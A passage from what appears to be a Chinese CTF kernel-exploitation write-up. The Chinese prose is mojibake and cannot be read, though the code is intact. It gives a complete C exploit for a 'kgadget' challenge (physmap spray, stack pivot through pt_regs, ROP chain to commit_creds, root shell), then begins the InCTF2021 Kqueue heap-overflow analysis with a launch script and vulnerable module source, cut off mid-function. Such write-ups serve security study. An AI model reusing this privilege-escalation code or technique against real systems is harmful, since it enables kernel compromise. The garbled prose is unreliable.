·çš„ payload</strong>ï¼Œä¹‹åå†éšæœºæŒ‘é€‰ä¸€ä¸ªçº¿æ€§æ˜ å°„åŒºä¸Šçš„åœ°å€è¿›è¡Œåˆ©ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±<strong>æœ‰å¾ˆå¤§çš„æ¦‚ç‡å‘½ä¸­åˆ°æˆ‘ä»¬å¸ƒç½®çš„ payload ä¸Š</strong>ï¼Œè¿™ç§æ”»å‡»æ‰‹æ³•ä¹Ÿç§°ä¸º <code>physmap spray</code></p></blockquote><h5 id="2-åœ¨å†…å­˜ä¸­æ„é€ ROPé“¾">2.åœ¨å†…å­˜ä¸­æ„é€ ROPé“¾</h5><p>ç”±äºå¼€å¯äº†KPTIï¼Œæ— æ³•ret2usrï¼Œè¦ropå‡ºcommit_creds(prepare_kernel_cred(0))åˆç¼ºä¸€ä¸ªå¿…è¦çš„<code>mov rdi,rax;ret</code>çš„gadgetï¼Œå…¶å®ä¹Ÿå¯èƒ½æœ‰</p><p>ï¼ˆå¦‚æœjmpçš„åœ°å€æŒ‡å‘retçš„è¯å°±æœ‰äº†ï¼Œä¸è¿‡å¤ªå¤šæ‡’å¾—æ‰¾ï¼Œè¿™é‡Œé‡‡å–å¦ä¸€ç§æ›´ç®€ä¾¿çš„ropæ–¹æ³•ï¼‰</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684501618947.png" alt="6"></p><p>ropå‡º<code>commit_creds(init_cred)</code>,è¿”å›ç”¨æˆ·æ€å¦é€‰æ‹©<code>swapgs_restore_regs_and_return_to_usermode</code>è¿™ä¸ªgadgetï¼Œè¿™æ˜¯ä¸€ä¸ªä¿å­˜pt_regsç»“æ„å¹¶ä¸”è¿”å›åˆ°ç”¨æˆ·æ€çš„å‡½æ•°çš„åœ°å€</p><p>(ç”¨swapgs_restore_regs_and_return_to_usermodeæ˜¯ä¸ºäº†é€šè¿‡åˆ‡æ¢é¡µè¡¨é€šè¿‡KPTIä¿æŠ¤)</p><p>ï¼ˆåœ°å€æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®initä¸ºroot æ¥catå‡ºæ¥ï¼‰</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684501618947.png" alt="7"></p><p>æˆ‘ä»¬+27åç§»è·³è¿‡å‰é¢çš„pop<img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684501618948.png" alt="8"></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9-1684501618947.png" alt="9"></p><p>æ‰€ä»¥ropè¿™ä¹ˆè¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[idx++] = pop_rdi_ret;<br>rop[idx++] = init_cred;<br>rop[idx++] = commit_creds;<br>rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>rop[idx++] = (<span class="hljs-type">size_t</span>) spawn_shell;<br>rop[idx++] = user_cs;<br>rop[idx++] = user_rflags;<br>rop[idx++] = user_sp;<br>rop[idx++] = user_ss;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ROPé“¾éƒ½æ˜¯åœ¨ç”¨æˆ·ç©ºé—´ç¼–å†™çš„ï¼Œèƒ½å¤Ÿæ˜ å°„åˆ°å†…æ ¸ç©ºé—´çš„æŸä¸ªåœ°æ–¹ï¼Œä½†æ˜¯è¦æ‰§è¡Œè¿™äº›ROPè¿˜éœ€è¦æˆ‘ä»¬å°†æ ˆå¼•å¯¼åˆ°è¿™äº›å†…æ ¸æ˜ å°„åŒºä¸­ã€‚å¯ä»¥ç”¨å½¢å¦‚<code>add rsp, offest ; ret</code>è¿™æ ·çš„gadgetæ¥ä½¿æ ˆæŒ‡é’ˆæŒ‡å‘pt_regsç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨pt_regsä¸Šæ„é€ ropé“¾ï¼Œä½†æ˜¯æœ¬é¢˜é™åˆ¶ä¸¥æ ¼åªèƒ½ä½¿ç”¨r9ï¼Œr8ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œæ‰€ä»¥æ²¡åŠæ³•ï¼Œå¯ä»¥å†ä¸€æ¬¡æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„ropé“¾ã€‚</p><p>ç”±äºä¸çŸ¥é“æŒ‡å‘æˆ‘ä»¬ç”³è¯·å†…å­˜çš„åç§»ä¸ºå¤šå°‘ï¼Œå¯ä»¥ç”¨slide codeï¼Œä¸€ç›´æ»‘åˆ°æˆ‘ä»¬çš„ææƒä»£ç </p><p>æˆ‘ä»¬å¯ä»¥ç”¨å½¢å¦‚<code>add rsp, offest ; ret</code>æˆ–è€…<code>ret</code>è¿™ç§gadgetå½“ä½œæ»‘æ¿ï¼Œä¸€ç›´æ»‘åˆ°ææƒä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add rsp, offest ; ret<br>add rsp, offest ; ret<br>add rsp, offest ; ret<br>add rsp, offest ; ret<br>.....<br>ret<br>ret<br>.....<br>pop_rdi_ret;<br>init_cred;<br>.....<br></code></pre></td></tr></table></figure><h5 id="3-æ¢³ç†æµç¨‹">3.æ¢³ç†æµç¨‹</h5><p>æˆ‘ä»¬rdxæ§åˆ¶ä¸ºä¸€ä¸ªçº¿æ€§æ˜ å°„åŒºçš„åœ°å€ï¼Œå½“è§¦å‘æ—¶ï¼Œæ‰§è¡Œè¿™ä¸ªçº¿æ€§æ˜ å°„åŒºçš„ä»£ç ï¼Œå› ä¸ºæˆ‘ä»¬å–·å°„äº†å¾ˆå¤šå¡«æ»¡payloadçš„é¡µï¼Œæ‰€ä»¥å¾ˆå¤§æ¦‚ç‡æ˜¯æ‰§è¡Œå¡«æ»¡payloadçš„é¡µé‡Œçš„<code>add rsp, offest ; ret</code>ï¼Œæ ˆè¿ç§»åˆ°å†…æ ¸å¯„å­˜å™¨pt_regsç»“æ„é‡Œçš„r9ï¼Œæ‰§è¡Œ<code>pop rsp;ret</code>ï¼Œæˆ‘ä»¬r8æ§åˆ¶ä¸ºè¿™ä¸ªçº¿æ€§æ˜ å°„åŒºçš„åœ°å€ï¼Œç¬¬äºŒæ¬¡æ ˆè¿ç§»åˆ°è¿™ä¸ªçº¿æ€§æ˜ å°„åŒºäº†ï¼Œæ‰§è¡Œ<code>add rsp, offest ; ret</code>å½“åšæ»‘æ¿ï¼Œæ»‘åˆ°<code>ret</code>ï¼Œæœ€åæ»‘åˆ°æˆ‘ä»¬çš„ææƒé“¾</p><h4 id="0x03exp">0x03exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">size_t</span> page_size=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds=<span class="hljs-number">0xffffffff810c92e0</span>;<span class="hljs-comment">//by set init root get or ida vmlinux</span><br><span class="hljs-type">size_t</span> prepare_kernel_cred=<span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">size_t</span> init_cred=<span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">rop_chain</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span>(;idx&lt;(page_size/<span class="hljs-number">8</span><span class="hljs-number">-0x30</span>);idx++)<br>        rop[idx]=<span class="hljs-number">0xffffffff810737fe</span>; <span class="hljs-comment">//add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret</span><br>            <span class="hljs-comment">//more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        <span class="hljs-comment">//rop[idx] = 0xffffffff810001fc ;//ret</span><br>        rop[idx]=<span class="hljs-number">0xffffffff8108c6f1</span>;<br>    <br><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>&#125;<br><br><span class="hljs-type">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> try_hit=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    fd =open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>,O_RDWR);<span class="hljs-comment">//read &amp; write of file</span><br>    <span class="hljs-keyword">if</span> (fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open /dev/kgadget error!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    page_size=sysconf(_SC_PAGESIZE);<span class="hljs-comment">//Get the current system page size</span><br>    <span class="hljs-comment">//construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    rop_chain(physmap_spray_arr[<span class="hljs-number">0</span>]); <br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">15000</span>;i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X]oom,error exit&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br>    <br>    try_hit=<span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    <span class="hljs-comment">//ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now trigger...&quot;</span>);<br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0xffffffff811483d0;&quot;</span>   <span class="hljs-comment">// pop rsp;ret stack migration again</span><br>    <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>    <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    ); <br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="05-heap-overflow">05.heap overflow</h2><h3 id="InCTF2021-Kqueue">InCTF2021 - Kqueue</h3><p>è§£å‹æ‰“åŒ…è¦åœ¨rootä¸‹è¿›è¡Œï¼Œä¸ç„¶å¯èƒ½é‡åˆ°å„ç§å¥‡æ€ªçš„æƒé™é—®é¢˜</p><h4 id="0x01ç¨‹åºåˆ†æ-3">0x01ç¨‹åºåˆ†æ</h4><p>åªè£…è½½äº†è¿™ä¸ªLKMï¼ŒæŒ‰å¥—è·¯æ¼æ´å°±åœ¨è¿™é‡Œé¢</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684499471325.png" alt="1"></p><h5 id="1-ä¿æŠ¤">1.ä¿æŠ¤</h5><p>å¼€å¯äº†kaslrï¼Œæ²¡å¼€å¯smep/smap,KPTI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">stty sane<br>exec qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel &quot;bzImage&quot; \<br>    -append &quot;console=ttyS0 oops=panic panic=-1 pti=off kaslr quiet&quot; \<br>    -monitor /dev/null \<br>    -initrd &quot;./rootfs.cpio&quot; \<br>    -s<br></code></pre></td></tr></table></figure><h5 id="2-æºç ">2.æºç </h5><p>ç¨‹åºå®ç°äº†åœ¨å†…æ ¸æ€çš„é˜Ÿåˆ—ç®¡ç†ï¼Œæ•°æ®ç»“æ„å­¦çš„ç¨€çƒ‚ï¼Œçœ‹éº»äº†</p><h6 id="ä¸€-ç»“æ„ä½“">ä¸€.ç»“æ„ä½“</h6><p>å®šä¹‰äº†ç®¡ç†ç»“æ„queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> data_size; <span class="hljs-comment">//æ¯ä¸ªqueue_entryæˆå‘˜çš„å¤§å°</span><br>  <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">//ä¸€ä¸ªé˜Ÿåˆ—æ€»å¤§å°</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<span class="hljs-comment">//queue_entryçš„æœ€å¤§æ•°é‡</span><br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><p>kqueuesæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯æœ€å¤š5ä¸ªé˜Ÿåˆ—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure><p>å®šä¹‰æˆå‘˜ç»“æ„queue_entry</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">queue_entry *kqueue_entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> idx;<span class="hljs-comment">//entryçš„ä¸‹æ ‡</span><br>  <span class="hljs-type">char</span> *data;<span class="hljs-comment">//å½“å‰entryç»´æŠ¤çš„æ•°æ®</span><br>  queue_entry *next; <span class="hljs-comment">//nextæŒ‡é’ˆ,å°±æ˜¯é“¾è¡¨å˜›</span><br>&#125;;<br></code></pre></td></tr></table></figure><h6 id="äºŒ-create-kqueue">äºŒ.create_kqueue</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-type">long</span> result = INVALID;<br><span class="hljs-comment">//é˜Ÿåˆ—æ•°é‡ä¸èƒ½å¤§äº5</span><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><span class="hljs-comment">//queue_entryæœ€å¤§æ•°é‡ä¸èƒ½ä¸º0</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><span class="hljs-comment">//queue_entryæˆå‘˜å¤§å°ä¸èƒ½å¤§äº0x20</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br>    queue_entry *kqueue_entry;<br><span class="hljs-comment">//ä¸‹é¢ä¸¤ä¸ªæ£€æŸ¥å°±æ˜¯åˆ¤æ–­æœ‰æ— æ•´æ•°æº¢å‡º</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><span class="hljs-comment">//ä¸€ä¸ªé˜Ÿåˆ—æ€»å¤§å°ä¸èƒ½è¿‡0x10000</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br> <span class="hljs-comment">//æ‰€æœ‰æ£€æŸ¥å®Œæ¯•ï¼Œå¼€å§‹åˆ†é…å†…å­˜</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-type">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br>    kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><span class="hljs-comment">//éå†æŸ¥æ‰¾æ•°ç»„é‡Œæœ‰æ— ç©ºä½™çš„</span><br>    <span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span 